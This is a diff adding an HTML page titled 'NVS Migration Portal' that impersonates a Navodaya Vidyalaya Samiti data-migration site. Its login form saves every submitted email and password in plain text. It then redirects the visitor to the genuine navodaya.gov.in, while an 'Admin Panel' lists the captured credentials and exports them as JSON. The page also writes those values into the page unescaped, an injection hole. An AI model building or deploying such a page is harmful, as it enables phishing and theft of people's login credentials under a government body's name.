@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NVS Migration Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 60px 80px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .overview {
+            color: #666;
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 40px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        button {
+            padding: 15px 40px;
+            font-size: 1.1em;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .migrate-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .migrate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .cancel-btn {
+            background: #f5f5f5;
+            color: #666;
+        }
+
+        .cancel-btn:hover {
+            background: #e0e0e0;
+            transform: translateY(-3px);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-content h2 {
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 1.8em;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            color: #555;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 0.95em;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .modal-buttons button {
+            flex: 1;
+            padding: 12px 20px;
+            font-size: 1em;
+        }
+
+        .error-message {
+            color: #e74c3c;
+            font-size: 0.9em;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .error-message.active {
+            display: block;
+        }
+
+        .success-message {
+            color: #27ae60;
+            font-size: 0.9em;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .success-message.active {
+            display: block;
+        }
+
+        .admin-panel {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            text-align: left;
+        }
+
+        .admin-panel h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .credentials-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
+        .credential-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            font-family: monospace;
+            font-size: 0.9em;
+        }
+
+        .credential-item:last-child {
+            border-bottom: none;
+        }
+
+        .export-btn {
+            background: #28a745;
+            color: white;
+            margin-top: 10px;
+        }
+
+        .export-btn:hover {
+            background: #218838;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 40px 30px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>NVS Migration Portal</h1>
+        <div class="overview">
+            <p>Welcome to the Navodaya Vidyalaya Samiti Migration Portal. This portal allows authorized users to migrate data and manage important information securely.</p>
+            <p style="margin-top: 15px;">Click "Migrate" to begin the migration process or "Cancel" to return to the main page.</p>
+        </div>
+        <div class="button-group">
+            <button class="migrate-btn" id="migrateBtn">Migrate</button>
+            <button class="cancel-btn" id="cancelBtn">Cancel</button>
+            <button class="export-btn" id="adminBtn">Admin Panel</button>
+        </div>
+
+        <!-- Admin Panel (Hidden by default) -->
+        <div class="admin-panel" id="adminPanel" style="display: none;">
+            <h3>Stored Credentials</h3>
+            <div class="credentials-list" id="credentialsList">
+                <!-- Credentials will be displayed here -->
+            </div>
+            <button class="export-btn" id="exportBtn">Export as JSON</button>
+            <button class="cancel-btn" id="clearBtn">Clear All</button>
+            <button class="cancel-btn" id="hideAdminBtn">Hide Panel</button>
+        </div>
+    </div>
+
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <h2>Login</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="password" id="password" name="password" required placeholder="Enter your password">
+                </div>
+                <div class="error-message" id="errorMessage">
+                    Please fill in all fields.
+                </div>
+                <div class="success-message" id="successMessage">
+                    Login successful! Redirecting...
+                </div>
+                <div class="modal-buttons">
+                    <button type="submit" class="migrate-btn">Login</button>
+                    <button type="button" class="cancel-btn" id="modalCancelBtn">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const migrateBtn = document.getElementById('migrateBtn');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const adminBtn = document.getElementById('adminBtn');
+        const loginModal = document.getElementById('loginModal');
+        const loginForm = document.getElementById('loginForm');
+        const modalCancelBtn = document.getElementById('modalCancelBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
+        const adminPanel = document.getElementById('adminPanel');
+        const credentialsList = document.getElementById('credentialsList');
+        const exportBtn = document.getElementById('exportBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const hideAdminBtn = document.getElementById('hideAdminBtn');
+
+        // Storage key for credentials
+        const STORAGE_KEY = 'nvs_credentials';
+
+        // Initialize
+        function init() {
+            updateCredentialsList();
+        }
+
+        // Save credentials to localStorage
+        function saveCredentials(email, password) {
+            const credentials = getStoredCredentials();
+            const newCredential = {
+                email: email,
+                password: password, // Note: In real applications, never store plain text passwords!
+                timestamp: new Date().toISOString(),
+                id: Date.now().toString()
+            };
+            
+            credentials.push(newCredential);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(credentials));
+            updateCredentialsList();
+        }
+
+        // Get stored credentials
+        function getStoredCredentials() {
+            const stored = localStorage.getItem(STORAGE_KEY);
+            return stored ? JSON.parse(stored) : [];
+        }
+
+        // Update credentials list in admin panel
+        function updateCredentialsList() {
+            const credentials = getStoredCredentials();
+            credentialsList.innerHTML = '';
+            
+            if (credentials.length === 0) {
+                credentialsList.innerHTML = '<div class="credential-item">No credentials stored yet.</div>';
+                return;
+            }
+            
+            credentials.forEach(cred => {
+                const div = document.createElement('div');
+                div.className = 'credential-item';
+                div.innerHTML = `
+                    <strong>Email:</strong> ${cred.email}<br>
+                    <strong>Password:</strong> ${cred.password}<br>
+                    <strong>Time:</strong> ${new Date(cred.timestamp).toLocaleString()}
+                `;
+                credentialsList.appendChild(div);
+            });
+        }
+
+        // Export credentials as JSON file
+        function exportCredentials() {
+            const credentials = getStoredCredentials();
+            const dataStr = JSON.stringify(credentials, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(dataBlob);
+            link.download = 'nvs_credentials.json';
+            link.click();
+        }
+
+        // Clear all credentials
+        function clearCredentials() {
+            if (confirm('Are you sure you want to clear all stored credentials?')) {
+                localStorage.removeItem(STORAGE_KEY);
+                updateCredentialsList();
+            }
+        }
+
+        // Event Listeners
+        migrateBtn.addEventListener('click', () => {
+            loginModal.classList.add('active');
+            errorMessage.classList.remove('active');
+            successMessage.classList.remove('active');
+        });
+
+        cancelBtn.addEventListener('click', () => {
+            window.location.href = '/';
+        });
+
+        adminBtn.addEventListener('click', () => {
+            adminPanel.style.display = 'block';
+            updateCredentialsList();
+        });
+
+        hideAdminBtn.addEventListener('click', () => {
+            adminPanel.style.display = 'none';
+        });
+
+        modalCancelBtn.addEventListener('click', () => {
+            loginModal.classList.remove('active');
+            loginForm.reset();
+            errorMessage.classList.remove('active');
+            successMessage.classList.remove('active');
+        });
+
+        loginModal.addEventListener('click', (e) => {
+            if (e.target === loginModal) {
+                loginModal.classList.remove('active');
+                loginForm.reset();
+                errorMessage.classList.remove('active');
+                successMessage.classList.remove('active');
+            }
+        });
+
+        exportBtn.addEventListener('click', exportCredentials);
+        clearBtn.addEventListener('click', clearCredentials);
+
+        // Handle form submission
+        loginForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                // Save credentials
+                saveCredentials(email, password);
+                
+                // Show success message
+                errorMessage.classList.remove('active');
+                successMessage.classList.add('active');
+                
+                // Redirect after delay
+                setTimeout(() => {
+                    window.location.href = 'https://navodaya.gov.in';
+                }, 2000);
+            } else {
+                errorMessage.classList.add('active');
+                successMessage.classList.remove('active');
+            }
+        });
+
+        // Initialize the application
+        init();
+    </script>
+</body>
+</html>
